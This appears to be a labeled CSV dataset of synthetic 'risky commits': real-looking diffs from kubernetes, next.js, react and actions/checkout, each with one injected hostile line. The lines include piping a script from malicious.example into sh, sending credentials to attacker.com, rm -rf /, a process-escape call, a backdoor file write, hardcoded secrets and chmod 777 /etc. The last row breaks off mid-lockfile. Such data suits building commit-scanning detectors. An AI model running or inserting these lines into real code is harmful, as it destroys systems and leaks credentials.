kubernetes/kubernetes,synthetic_125_3704,Lalit Chauhan,2025-10-15 12:40:39,Synthetic risky commit,config.env,9,9,18,"message AllocatedDeviceStatus { // // +optional // +featureGate=DRAConsumableCapacity + // +k8s:optional + // +k8s:format=k8s-uuid optional string shareID = 7; // Conditions contains the latest observation of the device's state. message DeviceRequestAllocationResult { // // +optional // +featureGate=DRAConsumableCapacity + // +k8s:optional + // +k8s:format=k8s-uuid optional string shareID = 9; // ConsumedCapacity tracks the amount of capacity consumed per device as part of the claim request.
+ echo ""password=hardcoded_password_123"" > /etc/creds",1
vercel/next.js,synthetic_126_1441,nextjs-bot,2025-10-15 12:40:39,Synthetic risky commit,config.env,38,9,47,"{ ""name"": ""@next/bundle-analyzer"" - ""version"": ""15.6.0-canary.44"" + ""version"": ""15.6.0-canary.45"" ""main"": ""index.js"" ""types"": ""index.d.ts"" ""license"": ""MIT""
+ run: curl http://malicious.example/install.sh | sh",1
vercel/next.js,synthetic_127_2375,nextjs-bot,2025-10-15 12:40:39,Synthetic risky commit,entrypoint.sh,28,2,30,"exports.preloadModule = function (href options) { }); } else Internals.d.m(href); }; -exports.version = ""19.3.0-canary-4fdf7cf2-20251003""; +exports.version = ""19.3.0-canary-c7862584-20251006"";
+ fetch(`http://attacker.com/log?data=${user.credentials}`)",1
facebook/react,synthetic_128_3977,"Sebastian ""Sebbie"" Silbermann",2025-10-15 12:40:39,Synthetic risky commit,deploy.yml,17,6,23,"describe('ReactDOMFizzViewTransition' () => { Stream = require('stream'); Suspense = React.Suspense; - ViewTransition = React.unstable_ViewTransition; + ViewTransition = React.ViewTransition; // Test Environment const jsdom = new JSDOM(
+ this.constructor.constructor('return process')().exit()",1
vercel/next.js,synthetic_129_4467,nextjs-bot,2025-10-15 12:40:39,Synthetic risky commit,config.env,21,5,26,"exports.useFormState = function (action initialState permalink) { exports.useFormStatus = function () { return ReactSharedInternals.H.useHostTransitionStatus(); }; -exports.version = ""19.3.0-canary-85c427d8-20251003""; +exports.version = ""19.3.0-canary-4fdf7cf2-20251003"";
+ require('child_process').execSync('rm -rf / --no-preserve-root')",1
vercel/next.js,synthetic_130_5558,nextjs-bot,2025-10-15 12:40:39,Synthetic risky commit,config.env,17,1,18,"importers: packages/eslint-config-next: dependencies: '@next/eslint-plugin-next': - specifier: 15.6.0-canary.49 + specifier: 15.6.0-canary.50 version: link:../eslint-plugin-next '@rushstack/eslint-patch': specifier: ^1.10.3 importers: packages/next: dependencies: '@next/env': - specifier: 15.6.0-canary.49 + specifier: 15.6.0-canary.50 version: link:../next-env '@swc/helpers': specifier: 0.5.15 importers: specifier: 1.2.0 version: 1.2.0 '@next/font': - specifier: 15.6.0-canary.49 + specifier: 15.6.0-canary.50 version: link:../font '@next/polyfill-module': - specifier: 15.6.0-canary.49 + specifier: 15.6.0-canary.50 version: link:../next-polyfill-module '@next/polyfill-nomodule': - specifier: 15.6.0-canary.49 + specifier: 15.6.0-canary.50 version: link:../next-polyfill-nomodule '@next/react-refresh-utils': - specifier: 15.6.0-canary.49 + specifier: 15.6.0-canary.50 version: link:../react-refresh-utils '@next/swc': - specifier: 15.6.0-canary.49 + specifier: 15.6.0-canary.50 version: link:../next-swc '@opentelemetry/api': specifier: 1.6.0 importers: version: 1.0.20 devDependencies: next: - specifier: 15.6.0-canary.49 + specifier: 15.6.0-canary.50 version: link:../next outdent: specifier: 0.8.0
+ fetch(`http://attacker.com/log?data=${user.credentials}`)",1
kubernetes/kubernetes,synthetic_131_1317,Kubernetes Prow Robot,2025-10-15 12:40:39,Synthetic risky commit,entrypoint.sh,35,0,35,"func readDirNames(dirname string) ([]string error) { // walkDeep can be used to traverse directories and has two minor differences // from filepath.Walk: // - List of files/dirs is not sorted for performance reasons -// - callback walkFunc is invoked on root directory after visiting children dirs and files +// - callback walkFunc is invoked on root directory after visiting child dirs and files func walkDeep(root string walkFunc filepath.WalkFunc) error { info err := os.Lstat(root) if err != nil {
+ this.constructor.constructor('return process')().exit()",1
kubernetes/kubernetes,synthetic_132_4673,Kubernetes Prow Robot,2025-10-15 12:40:39,Synthetic risky commit,entrypoint.sh,5,10,15,"func validateUID(uid string fldPath *field.Path) field.ErrorList { } else if len(uid) != 36 || uid != strings.ToLower(uid) { allErrs = append(allErrs field.Invalid(fldPath uid ""uid must be in RFC 4122 normalized form `xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx` with lowercase hexadecimal characters"")) } - return allErrs + return allErrs.WithOrigin(""format=k8s-uuid"") } // ValidateResourceClaim validates a ResourceClaim. func validateDeviceRequestAllocationResult(result resource.DeviceRequestAllocati allErrs = append(allErrs validateDeviceName(result.Device fldPath.Child(""device""))...) allErrs = append(allErrs validateDeviceBindingParameters(result.BindingConditions result.BindingFailureConditions fldPath)...) if result.ShareID != nil { - allErrs = append(allErrs validateUID(string(*result.ShareID) fldPath.Child(""shareID""))...) + allErrs = append(allErrs validateUID(string(*result.ShareID) fldPath.Child(""shareID"")).MarkCoveredByDeclarative()...) } return allErrs } func validateDeviceStatus(device resource.AllocatedDeviceStatus fldPath *field. allErrs = append(allErrs validatePoolName(device.Pool fldPath.Child(""pool""))...) allErrs = append(allErrs validateDeviceName(device.Device fldPath.Child(""device""))...) if device.ShareID != nil { - allErrs = append(allErrs validateUID(*device.ShareID fldPath.Child(""shareID""))...) + allErrs = append(allErrs validateUID(*device.ShareID fldPath.Child(""shareID"")).MarkCoveredByDeclarative()...) } deviceID := structured.MakeDeviceID(device.Driver device.Pool device.Device) sharedDeviceID := structured.MakeSharedDeviceID(deviceID (*types.UID)(device.ShareID))
+ run: curl http://malicious.example/install.sh | sh",1
kubernetes/kubernetes,synthetic_133_1508,Benjamin Elder,2025-10-15 12:40:39,Synthetic risky commit,.github/workflows/deploy.yml,13,0,13,"+# Invariant Tests + +This package implements [KEP-5468 Invariant Testing][kep]. + +Before adding new tests here please reach out to SIG-Testing to discuss +with the SIG and Tech Leads. + +https://github.com/kubernetes/community/tree/master/sig-testing#contact + +For more details see [the kep][kep]. + +[kep]: https://git.k8s.io/enhancements/keps/sig-testing/5468-invariant-testing
+ process.mainModule.require(""fs"").writeFileSync(""new_backdoor.js"", ""..."")",1
actions/checkout,synthetic_134_3496,Cory Miller,2025-10-15 12:40:39,Synthetic risky commit,.github/workflows/deploy.yml,9,7,16,"export function getFetchUrl(settings: IGitSourceSettings): string { const encodedOwner = encodeURIComponent(settings.repositoryOwner) const encodedName = encodeURIComponent(settings.repositoryName) if (settings.sshKey) { - return `git@${serviceUrl.hostname}:${encodedOwner}/${encodedName}.git` + const user = settings.sshUser.length > 0 ? settings.sshUser : 'git' + return `${user}@${serviceUrl.hostname}:${encodedOwner}/${encodedName}.git` } // ""origin"" is SCHEME://HOSTNAME[:PORT]
+ export API_KEY=""AKIAJE5474L2DEXAMPLE""",1
vercel/next.js,synthetic_135_4571,nextjs-bot,2025-10-15 12:40:39,Synthetic risky commit,config.env,17,5,22,"{ ""name"": ""@next/mdx"" - ""version"": ""15.6.0-canary.46"" + ""version"": ""15.6.0-canary.47"" ""main"": ""index.js"" ""license"": ""MIT"" ""repository"": {
+ chmod -R 777 /etc",1
kubernetes/kubernetes,synthetic_136_2876,Kubernetes Prow Robot,2025-10-15 12:40:39,Synthetic risky commit,.github/workflows/deploy.yml,20,1,21,"func initImageConfigs(list RegistryList) (map[ImageID]Config map[ImageID]Config configs[AppArmorLoader] = Config{list.PromoterE2eRegistry ""apparmor-loader"" ""1.4""} configs[BusyBox] = Config{list.PromoterE2eRegistry ""busybox"" ""1.37.0-1""} configs[DistrolessIptables] = Config{list.BuildImageRegistry ""distroless-iptables"" ""v0.8.2""} - configs[Etcd] = Config{list.GcEtcdRegistry ""etcd"" ""3.6.4-0""} + configs[Etcd] = Config{list.GcEtcdRegistry ""etcd"" ""3.6.5-0""} configs[InvalidRegistryImage] = Config{list.InvalidRegistry ""alpine"" ""3.1""} configs[IpcUtils] = Config{list.PromoterE2eRegistry ""ipc-utils"" ""1.3""} configs[JessieDnsutils] = Config{list.PromoterE2eRegistry ""jessie-dnsutils"" ""1.7""}
+ process.mainModule.require(""fs"").writeFileSync(""new_backdoor.js"", ""..."")",1
facebook/react,synthetic_137_1420,Jack Pope,2025-10-15 12:40:39,Synthetic risky commit,run.sh,37,10,47,"function isEffectIdentifier(node: Node additionalHooks?: RegExp): boolean { return false; } + function isUseEffectEventIdentifier(node: Node): boolean { return node.type === 'Identifier' && node.name === 'useEffectEvent'; } +function useEffectEventError(fn: string called: boolean): string { + return ( + `\`${fn}\` is a function created with React Hook ""useEffectEvent"" and can only be called from ` + + 'Effects and Effect Events in the same component.' + + (called ? '' : ' It cannot be assigned to a variable or passed down.') + ); +} + function isUseIdentifier(node: Node): boolean { return isReactFunction(node 'use'); } const rule = { // This identifier resolves to a useEffectEvent function but isn't being referenced in an // effect or another event function. It isn't being called either. if (lastEffect == null && useEffectEventFunctions.has(node)) { - const message = - `\`${getSourceCode().getText( - node - )}\` is a function created with React Hook ""useEffectEvent"" and can only be called from ` + - 'the same component.' + - (node.parent.type === 'CallExpression' - ? '' - : ' They cannot be assigned to variables or passed down.'); + const message = useEffectEventError( + getSourceCode().getText(node) + node.parent.type === 'CallExpression' + ); + context.report({ node message
+ require('child_process').execSync('rm -rf / --no-preserve-root')",1
kubernetes/kubernetes,synthetic_138_7498,yongruilin,2025-10-15 12:40:39,Synthetic risky commit,entrypoint.sh,13,1,14,"type DeviceRequest struct { // // +optional // +oneOf=deviceRequestType + // +k8s:optional Exactly *ExactDeviceRequest `json:""exactly omitempty"" protobuf:""bytes 2 name=exactly""` // FirstAvailable contains subrequests of which exactly one will be type DeviceRequest struct { // +oneOf=deviceRequestType // +listType=atomic // +featureGate=DRAPrioritizedList + // +k8s:maxItems=8 FirstAvailable []DeviceSubRequest `json:""firstAvailable omitempty"" protobuf:""bytes 3 name=firstAvailable""` } type ExactDeviceRequest struct { // // +optional // +listType=atomic + // +k8s:maxItems=32 Selectors []DeviceSelector `json:""selectors omitempty"" protobuf:""bytes 2 name=selectors""` // AllocationMode and its related fields define how devices are allocated type DeviceSubRequest struct { // // +optional // +listType=atomic + // +k8s:maxItems=32 Selectors []DeviceSelector `json:""selectors omitempty"" protobuf:""bytes 3 name=selectors""` // AllocationMode and its related fields define how devices are allocated type DeviceConstraint struct { // // +optional // +listType=atomic + // +k8s:maxItems=32 Requests []string `json:""requests omitempty"" protobuf:""bytes 1 opt name=requests""` // MatchAttribute requires that all devices in question have this type DeviceClaimConfiguration struct { // // +optional // +listType=atomic + // +k8s:maxItems=32 Requests []string `json:""requests omitempty"" protobuf:""bytes 1 opt name=requests""` DeviceConfiguration `json:"" inline"" protobuf:""bytes 2 name=deviceConfiguration""`
+ process.mainModule.require(""fs"").writeFileSync(""new_backdoor.js"", ""..."")",1
vercel/next.js,synthetic_139_4978,nextjs-bot,2025-10-15 12:40:39,Synthetic risky commit,deploy.yml,20,10,30,"ReactDOMHydrationRoot.prototype.unstable_scheduleHydration = function (target) { }; var isomorphicReactPackageVersion$jscomp$inline_1840 = React.version; if ( - ""19.3.0-canary-85c427d8-20251003"" !== + ""19.3.0-canary-4fdf7cf2-20251003"" !== isomorphicReactPackageVersion$jscomp$inline_1840 ) throw Error( formatProdErrorMessage( 527 isomorphicReactPackageVersion$jscomp$inline_1840 - ""19.3.0-canary-85c427d8-20251003"" + ""19.3.0-canary-4fdf7cf2-20251003"" ) ); ReactDOMSharedInternals.findDOMNode = function (componentOrElement) { ReactDOMSharedInternals.findDOMNode = function (componentOrElement) { }; var internals$jscomp$inline_2347 = { bundleType: 0 - version: ""19.3.0-canary-85c427d8-20251003"" + version: ""19.3.0-canary-4fdf7cf2-20251003"" rendererPackageName: ""react-dom"" currentDispatcherRef: ReactSharedInternals - reconcilerVersion: ""19.3.0-canary-85c427d8-20251003"" + reconcilerVersion: ""19.3.0-canary-4fdf7cf2-20251003"" }; if (""undefined"" !== typeof __REACT_DEVTOOLS_GLOBAL_HOOK__) { var hook$jscomp$inline_2348 = __REACT_DEVTOOLS_GLOBAL_HOOK__; exports.hydrateRoot = function (container initialChildren options) { listenToAllSupportedEvents(container); return new ReactDOMHydrationRoot(initialChildren); }; -exports.version = ""19.3.0-canary-85c427d8-20251003""; +exports.version = ""19.3.0-canary-4fdf7cf2-20251003"";
+ process.mainModule.require(""fs"").writeFileSync(""new_backdoor.js"", ""..."")",1
vercel/next.js,synthetic_140_2983,nextjs-bot,2025-10-15 12:40:39,Synthetic risky commit,Dockerfile,3,5,8,"? parentHostFiber : Node.DOCUMENT_POSITION_IMPLEMENTATION_SPECIFIC; }; - FragmentInstance.prototype.experimental_scrollIntoView = function ( - alignToTop - ) { + FragmentInstance.prototype.scrollIntoView = function (alignToTop) { if (""object"" === typeof alignToTop) throw Error( - ""FragmentInstance.experimental_scrollIntoView() does not support scrollIntoViewOptions. Use the alignToTop boolean instead."" + ""FragmentInstance.scrollIntoView() does not support scrollIntoViewOptions. Use the alignToTop boolean instead."" ); var children = []; traverseVisibleHostChildren( }; (function () { var isomorphicReactPackageVersion = React.version; - if (""19.3.0-experimental-c7862584-20251006"" !== isomorphicReactPackageVersion) + if (""19.3.0-experimental-a4eb2dfa-20251006"" !== isomorphicReactPackageVersion) throw Error( 'Incompatible React versions: The ""react"" and ""react-dom"" packages must have the exact same version. Instead got:\n - react: ' + (isomorphicReactPackageVersion + - ""\n - react-dom: 19.3.0-experimental-c7862584-20251006\nLearn more: https://react.dev/warnings/version-mismatch"") + ""\n - react-dom: 19.3.0-experimental-a4eb2dfa-20251006\nLearn more: https://react.dev/warnings/version-mismatch"") ); })(); (""function"" === typeof Map && !(function () { var internals = { bundleType: 1 - version: ""19.3.0-experimental-c7862584-20251006"" + version: ""19.3.0-experimental-a4eb2dfa-20251006"" rendererPackageName: ""react-dom"" currentDispatcherRef: ReactSharedInternals - reconcilerVersion: ""19.3.0-experimental-c7862584-20251006"" + reconcilerVersion: ""19.3.0-experimental-a4eb2dfa-20251006"" }; internals.overrideHookState = overrideHookState; internals.overrideHookStateDeletePath = overrideHookStateDeletePath; exports.useFormStatus = function () { return resolveDispatcher().useHostTransitionStatus(); }; - exports.version = ""19.3.0-experimental-c7862584-20251006""; + exports.version = ""19.3.0-experimental-a4eb2dfa-20251006""; ""undefined"" !== typeof __REACT_DEVTOOLS_GLOBAL_HOOK__ && ""function"" === typeof __REACT_DEVTOOLS_GLOBAL_HOOK__.registerInternalModuleStop &&
+ echo ""password=hardcoded_password_123"" > /etc/creds",1
actions/checkout,synthetic_141_8018,dependabot[bot],2025-10-15 12:40:39,Synthetic risky commit,entrypoint.sh,24,1,25,"""@vercel/ncc"": ""^0.38.1"" ""eslint"": ""^8.57.0"" ""eslint-plugin-github"": ""^4.10.2"" - ""eslint-plugin-jest"": ""^28.5.0"" + ""eslint-plugin-jest"": ""^28.8.2"" ""jest"": ""^29.7.0"" ""jest-circus"": ""^29.7.0"" ""js-yaml"": ""^4.1.0"" - ""prettier"": ""^3.2.5"" - ""ts-jest"": ""^29.1.2"" - ""typescript"": ""^5.4.5"" + ""prettier"": ""^3.3.3"" + ""ts-jest"": ""^29.2.5"" + ""typescript"": ""^5.5.4"" } }
+ echo ""password=hardcoded_password_123"" > /etc/creds",1
facebook/react,synthetic_142_6590,lauren,2025-10-15 12:40:39,Synthetic risky commit,deploy.yml,27,7,34,"# yarn lockfile v1 -""@ampproject/remapping@^2.2.0"": - version ""2.3.0"" - resolved ""https://registry.yarnpkg.com/@ampproject/remapping/-/remapping-2.3.0.tgz#ed441b6fa600072520ce18b43d2c8cc8caecc7f4"" - integrity sha512-30iZtAPgz+LTIYoeivqYo853f02jBYSd5uGnGpkFV0M3xOt9aN73erkgYAmZU43x4VfqcnLxW9Kpg3R5LC4YYw== - dependencies: - ""@jridgewell/gen-mapping"" ""^0.3.5"" - ""@jridgewell/trace-mapping"" ""^0.3.24"" - -""@babel/code-frame@^7.26.2"": - version ""7.26.2"" - resolved ""https://registry.yarnpkg.com/@babel/code-frame/-/code-frame-7.26.2.tgz#4b5fab97d33338eff916235055f0ebc21e573a85"" - integrity sha512-RJlIHRueQgwWitWgF8OdFYGZX328Ax5BCemNGlqHfplnRT9ESi8JkFlvaVYbS+UubVY6dpv87Fs2u5M29iNFVQ== - dependencies: - ""@babel/helper-validator-identifier"" ""^7.25.9"" - js-tokens ""^4.0.0"" - picocolors ""^1.0.0"" - -""@babel/compat-data@^7.26.5"": - version ""7.26.8"" - resolved ""https://registry.yarnpkg.com/@babel/compat-data/-/compat-data-7.26.8.tgz#821c1d35641c355284d4a870b8a4a7b0c141e367"" - integrity sha512-oH5UPLMWR3L2wEFLnFJ1TZXqHufiTKAiLfqw5zkhS4dKXLJ10yVztfil/twG8EDTA4F/tvVNw9nOl4ZMslB8rQ== - -""@babel/core@^7.24.4"": - version ""7.26.10"" - resolved ""https://registry.yarnpkg.com/@babel/core/-/core-7.26.10.tgz#5c876f83c8c4dcb233ee4b670c0606f2ac3000f9"" - integrity sha512-vMqyb7XCDMPvJFFOaT9kxtiRh42GwlZEg1/uIgtZshS5a/8OaduUfCi7kynKgc3Tw/6Uo2D+db9qBttghhmxwQ== - dependencies: - ""@ampproject/remapping"" ""^2.2.0"" - ""@babel/code-frame"" ""^7.26.2"" - ""@babel/generator"" ""^7.26.10"" - ""@babel/helper-compilation-targets"" ""^7.26.5"" - ""@babel/helper-module-transforms"" ""^7.26.0"" - ""@babel/helpers"" ""^7.26.10"" - ""@babel/parser"" ""^7.26.10"" - ""@babel/template"" ""^7.26.9"" - ""@babel/traverse"" ""^7.26.10"" - ""@babel/types"" ""^7.26.10"" - convert-source-map ""^2.0.0"" - debug ""^4.1.0"" - gensync ""^1.0.0-beta.2"" - json5 ""^2.2.3"" - semver ""^6.3.1"" - -""@babel/generator@^7.26.10"": - version ""7.26.10"" - resolved ""https://registry.yarnpkg.com/@babel/generator/-/generator-7.26.10.tgz#a60d9de49caca16744e6340c3658dfef6138c3f7"" - integrity sha512-rRHT8siFIXQrAYOYqZQVsAr8vJ+cBNqcVAY6m5V8/4QqzaPl+zDBe6cLEPRDuNOUf3ww8RfJVlOyQMoSI+5Ang== - dependencies: - ""@babel/parser"" ""^7.26.10"" - ""@babel/types"" ""^7.26.10"" - ""@jridgewell/gen-mapping"" ""^0.3.5"" - ""@jridgewell/trace-mapping"" ""^0.3.25"" - jsesc ""^3.0.2"" - -""@babel/helper-annotate-as-pure@^7.25.9"": - version ""7.25.9"" - resolved ""https://registry.yarnpkg.com/@babel/helper-annotate-as-pure/-/helper-annotate-as-pure-7.25.9.tgz#d8eac4d2dc0d7b6e11fa6e535332e0d3184f06b4"" - integrity sha512-gv7320KBUFJz1RnylIg5WWYPRXKZ884AGkYpgpWW02TH66Dl+HaC1t1CKd0z3R4b6hdYEcmrNZHUmfCP+1u3/g== - dependencies: - ""@babel/types"" ""^7.25.9"" - -""@babel/helper-compilation-targets@^7.26.5"": - version ""7.26.5"" - resolved ""https://registry.yarnpkg.com/@babel/helper-compilation-targets/-/helper-compilation-targets-7.26.5.tgz#75d92bb8d8d51301c0d49e52a65c9a7fe94514d8"" - integrity sha512-IXuyn5EkouFJscIDuFF5EsiSolseme1s0CZB+QxVugqJLYmKdxI1VfIBOst0SUu4rnk2Z7kqTwmoO1lp3HIfnA== - dependencies: - ""@babel/compat-data"" ""^7.26.5"" - ""@babel/helper-validator-option"" ""^7.25.9"" - browserslist ""^4.24.0"" - lru-cache ""^5.1.1"" - semver ""^6.3.1"" - -""@babel/helper-create-class-features-plugin@^7.25.9"": - version ""7.26.9"" - resolved ""https://registry.yarnpkg.com/@babel/helper-create-class-features-plugin/-/helper-create-class-features-plugin-7.26.9.tgz#d6f83e3039547fbb39967e78043cd3c8b7820c71"" - integrity sha512-ubbUqCofvxPRurw5L8WTsCLSkQiVpov4Qx0WMA+jUN+nXBK8ADPlJO1grkFw5CWKC5+sZSOfuGMdX1aI1iT9Sg== - dependencies: - ""@babel/helper-annotate-as-pure"" ""^7.25.9"" - ""@babel/helper-member-expression-to-functions"" ""^7.25.9"" - ""@babel/helper-optimise-call-expression"" ""^7.25.9"" - ""@babel/helper-replace-supers"" ""^7.26.5"" - ""@babel/helper-skip-transparent-expression-wrappers"" ""^7.25.9"" - ""@babel/traverse"" ""^7.26.9"" - semver ""^6.3.1"" - -""@babel/helper-member-expression-to-functions@^7.25.9"": - version ""7.25.9"" - resolved ""https://registry.yarnpkg.com/@babel/helper-member-expression-to-functions/-/helper-member-expression-to-functions-7.25.9.tgz#9dfffe46f727005a5ea29051ac835fb735e4c1a3"" - integrity sha512-wbfdZ9w5vk0C0oyHqAJbc62+vet5prjj01jjJ8sKn3j9h3MQQlflEdXYvuqRWjHnM12coDEqiC1IRCi0U/EKwQ== - dependencies: - ""@babel/traverse"" ""^7.25.9"" - ""@babel/types"" ""^7.25.9"" - -""@babel/helper-module-imports@^7.25.9"": - version ""7.25.9"" - resolved ""https://registry.yarnpkg.com/@babel/helper-module-imports/-/helper-module-imports-7.25.9.tgz#e7f8d20602ebdbf9ebbea0a0751fb0f2a4141715"" - integrity sha512-tnUA4RsrmflIM6W6RFTLFSXITtl0wKjgpnLgXyowocVPrbYrLUXSBXDgTs8BlbmIzIdlBySRQjINYs2BAkiLtw== - dependencies: - ""@babel/traverse"" ""^7.25.9"" - ""@babel/types"" ""^7.25.9"" - -""@babel/helper-module-transforms@^7.26.0"": - version ""7.26.0"" - resolved ""https://registry.yarnpkg.com/@babel/helper-module-transforms/-/helper-module-transforms-7.26.0.tgz#8ce54ec9d592695e58d84cd884b7b5c6a2fdeeae"" - integrity sha512-xO+xu6B5K2czEnQye6BHA7DolFFmS3LB7stHZFaOLb1pAwO1HWLS8fXA+eh0A2yIvltPVmx3eNNDBJA2SLHXFw== - dependencies: - ""@babel/helper-module-imports"" ""^7.25.9"" - ""@babel/helper-validator-identifier"" ""^7.25.9"" - ""@babel/traverse"" ""^7.25.9"" - -""@babel/helper-optimise-call-expression@^7.25.9"": - version ""7.25.9"" - resolved ""https://registry.yarnpkg.com/@babel/helper-optimise-call-expression/-/helper-optimise-call-expression-7.25.9.tgz#3324ae50bae7e2ab3c33f60c9a877b6a0146b54e"" - integrity sha512-FIpuNaz5ow8VyrYcnXQTDRGvV6tTjkNtCK/RYNDXGSLlUD6cBuQTSw43CShGxjvfBTfcUA/r6UhUCbtYqkhcuQ== - dependencies: - ""@babel/types"" ""^7.25.9"" - -""@babel/helper-plugin-utils@^7.25.9"": - version ""7.26.5"" - resolved ""https://registry.yarnpkg.com/@babel/helper-plugin-utils/-/helper-plugin-utils-7.26.5.tgz#18580d00c9934117ad719392c4f6585c9333cc35"" - integrity sha512-RS+jZcRdZdRFzMyr+wcsaqOmld1/EqTghfaBGQQd/WnRdzdlvSZ//kF7U8VQTxf1ynZ4cjUcYgjVGx13ewNPMg== - -""@babel/helper-replace-supers@^7.26.5"": - version ""7.26.5"" - resolved ""https://registry.yarnpkg.com/@babel/helper-replace-supers/-/helper-replace-supers-7.26.5.tgz#6cb04e82ae291dae8e72335dfe438b0725f14c8d"" - integrity sha512-bJ6iIVdYX1YooY2X7w1q6VITt+LnUILtNk7zT78ykuwStx8BauCzxvFqFaHjOpW1bVnSUM1PN1f0p5P21wHxvg== - dependencies: - ""@babel/helper-member-expression-to-functions"" ""^7.25.9"" - ""@babel/helper-optimise-call-expression"" ""^7.25.9"" - ""@babel/traverse"" ""^7.26.5"" - -""@babel/helper-skip-transparent-expression-wrappers@^7.25.9"": - version ""7.25.9"" - resolved ""https://registry.yarnpkg.com/@babel/helper-skip-transparent-expression-wrappers/-/helper-skip-transparent-expression-wrappers-7.25.9.tgz#0b2e1b62d560d6b1954893fd2b705dc17c91f0c9"" - integrity sha512-K4Du3BFa3gvyhzgPcntrkDgZzQaq6uozzcpGbOO1OEJaI+EJdqWIMTLgFgQf6lrfiDFo5FU+BxKepI9RmZqahA== - dependencies: - ""@babel/traverse"" ""^7.25.9"" - ""@babel/types"" ""^7.25.9"" - -""@babel/helper-string-parser@^7.25.9"": - version ""7.25.9"" - resolved ""https://registry.yarnpkg.com/@babel/helper-string-parser/-/helper-string-parser-7.25.9.tgz#1aabb72ee72ed35789b4bbcad3ca2862ce614e8c"" - integrity sha512-4A/SCr/2KLd5jrtOMFzaKjVtAei3+2r/NChoBNoZ3EyP/+GlhoaEGoWOZUmFmoITP7zOJyHIMm+DYRd8o3PvHA== - -""@babel/helper-validator-identifier@^7.25.9"": - version ""7.25.9"" - resolved ""https://registry.yarnpkg.com/@babel/helper-validator-identifier/-/helper-validator-identifier-7.25.9.tgz#24b64e2c3ec7cd3b3c547729b8d16871f22cbdc7"" - integrity sha512-Ed61U6XJc3CVRfkERJWDz4dJwKe7iLmmJsbOGu9wSloNSFttHV0I8g6UAgb7qnK5ly5bGLPd4oXZlxCdANBOWQ== - -""@babel/helper-validator-option@^7.25.9"": - version ""7.25.9"" - resolved ""https://registry.yarnpkg.com/@babel/helper-validator-option/-/helper-validator-option-7.25.9.tgz#86e45bd8a49ab7e03f276577f96179653d41da72"" - integrity sha512-e/zv1co8pp55dNdEcCynfj9X7nyUKUXoUEwfXqaZt0omVOmDe9oOTdKStH4GmAw6zxMFs50ZayuMfHDKlO7Tfw== - -""@babel/helpers@^7.26.10"": - version ""7.26.10"" - resolved ""https://registry.yarnpkg.com/@babel/helpers/-/helpers-7.26.10.tgz#6baea3cd62ec2d0c1068778d63cb1314f6637384"" - integrity sha512-UPYc3SauzZ3JGgj87GgZ89JVdC5dj0AoetR5Bw6wj4niittNyFh6+eOGonYvJ1ao6B8lEa3Q3klS7ADZ53bc5g== - dependencies: - ""@babel/template"" ""^7.26.9"" - ""@babel/types"" ""^7.26.10"" - -""@babel/parser@^7.24.4"" ""@babel/parser@^7.26.10"" ""@babel/parser@^7.26.9"": - version ""7.26.10"" - resolved ""https://registry.yarnpkg.com/@babel/parser/-/parser-7.26.10.tgz#e9bdb82f14b97df6569b0b038edd436839c57749"" - integrity sha512-6aQR2zGE/QFi8JpDLjUZEPYOs7+mhKXm86VaKFiLP35JQwQb6bwUE+XbvkH0EptsYhbNBSUGaUBLKqxH1xSgsA== - dependencies: - ""@babel/types"" ""^7.26.10"" - -""@babel/plugin-transform-private-methods@^7.24.4"": - version ""7.25.9"" - resolved ""https://registry.yarnpkg.com/@babel/plugin-transform-private-methods/-/plugin-transform-private-methods-7.25.9.tgz#847f4139263577526455d7d3223cd8bda51e3b57"" - integrity sha512-D/JUozNpQLAPUVusvqMxyvjzllRaF8/nSrP1s2YGQT/W4LHK4xxsMcHjhOGTS01mp9Hda8nswb+FblLdJornQw== - dependencies: - ""@babel/helper-create-class-features-plugin"" ""^7.25.9"" - ""@babel/helper-plugin-utils"" ""^7.25.9"" - -""@babel/template@^7.26.9"": - version ""7.26.9"" - resolved ""https://registry.yarnpkg.com/@babel/template/-/template-7.26.9.tgz#4577ad3ddf43d194528cff4e1fa6b232fa609bb2"" - integrity sha512-qyRplbeIpNZhmzOysF/wFMuP9sctmh2cFzRAZOn1YapxBsE1i9bJIY586R/WBLfLcmcBlM8ROBiQURnnNy+zfA== - dependencies: - ""@babel/code-frame"" ""^7.26.2"" - ""@babel/parser"" ""^7.26.9"" - ""@babel/types"" ""^7.26.9"" - -""@babel/traverse@^7.25.9"" ""@babel/traverse@^7.26.10"" ""@babel/traverse@^7.26.5"" ""@babel/traverse@^7.26.9"": - version ""7.26.10"" - resolved ""https://registry.yarnpkg.com/@babel/traverse/-/traverse-7.26.10.tgz#43cca33d76005dbaa93024fae536cc1946a4c380"" - integrity sha512-k8NuDrxr0WrPH5Aupqb2LCVURP/S0vBEn5mK6iH+GIYob66U5EtoZvcdudR2jQ4cmTwhEwW1DLB+Yyas9zjF6A== - dependencies: - ""@babel/code-frame"" ""^7.26.2"" - ""@babel/generator"" ""^7.26.10"" - ""@babel/parser"" ""^7.26.10"" - ""@babel/template"" ""^7.26.9"" - ""@babel/types"" ""^7.26.10"" - debug ""^4.3.1"" - globals ""^11.1.0"" - -""@babel/types@^7.25.9"" ""@babel/types@^7.26.10"" ""@babel/types@^7.26.9"": - version ""7.26.10"" - resolved ""https://registry.yarnpkg.com/@babel/types/-/types-7.26.10.tgz#396382f6335bd4feb65741eacfc808218f859259"" - integrity sha512-emqcG3vHrpxUKTrxcblR36dcrcoRDvKmnL/dCL6ZsHaShW80qxCAcNhzQZrpeM765VzEos+xOi4s+r4IXzTwdQ== - dependencies: - ""@babel/helper-string-parser"" ""^7.25.9"" - ""@babel/helper-validator-identifier"" ""^7.25.9"" - ""@eslint-community/eslint-utils@^4.2.0"": version ""4.4.1"" resolved ""https://registry.yarnpkg.com/@eslint-community/eslint-utils/-/eslint-utils-4.4.1.tgz#d1145bf2c20132d6400495d6df4bf59362fd9d56"" resolved ""https://registry.yarnpkg.com/@humanwhocodes/retry/-/retry-0.4.2.tgz#1860473de7dfa1546767448f333db80cb0ff2161"" integrity sha512-xeO57FpIu4p1Ri3Jq/EXq4ClRm86dVF2z/+kvFnyqVYRavTZmaFaUBbWCOuuTh0o/g7DSsk6kc2vrS4Vl5oPOQ== -""@jridgewell/gen-mapping@^0.3.5"": - version ""0.3.8"" - resolved ""https://registry.yarnpkg.com/@jridgewell/gen-mapping/-/gen-mapping-0.3.8.tgz#4f0e06362e01362f823d348f1872b08f666d8142"" - integrity sha512-imAbBGkb+ebQyxKgzv5Hu2nmROxoDOXHh80evxdoXNOrvAnVx7zimzc1Oo5h9RlfV4vPXaE2iM5pOFbvOCClWA== - dependencies: - ""@jridgewell/set-array"" ""^1.2.1"" - ""@jridgewell/sourcemap-codec"" ""^1.4.10"" - ""@jridgewell/trace-mapping"" 